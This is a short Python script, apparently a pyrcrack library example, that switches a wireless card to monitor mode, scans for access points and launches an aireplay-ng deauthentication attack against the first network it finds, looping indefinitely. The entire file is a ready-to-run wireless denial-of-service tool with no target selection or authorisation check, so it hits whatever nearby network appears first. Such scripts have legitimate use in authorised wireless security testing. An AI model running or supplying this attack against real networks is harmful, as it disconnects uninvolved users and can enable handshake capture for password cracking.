"""Deauth"""
import sys
from contextlib import suppress
import asyncio
import pyrcrack


async def attack(interface, apo):
    """Run aireplay deauth attack."""
    async with pyrcrack.AirmonNg() as airmon:
        await airmon.set_monitor(interface['interface'], apo.channel)
        async with pyrcrack.AireplayNg() as aireplay:
            await aireplay.run(interface['interface'], deauth=10, D=True)
            while True:
                print(aireplay.meta)
                await asyncio.sleep(2)


async def deauth():
    """Scan for targets, return json."""
    async with pyrcrack.AirmonNg() as airmon:
        interface = (await airmon.list_wifis())[0]['interface']
        interface = (await airmon.set_monitor(interface))[0]

        async with pyrcrack.AirodumpNg() as pdump:
            await pdump.run(interface['interface'], write_interval=1)
            # Extract first results
            while True:
                with suppress(KeyError):
                    await asyncio.sleep(2)
                    ap = pdump.sorted_aps()[0]
                    break
            # Deauth.
            await attack(interface, ap)


asyncio.run(deauth())
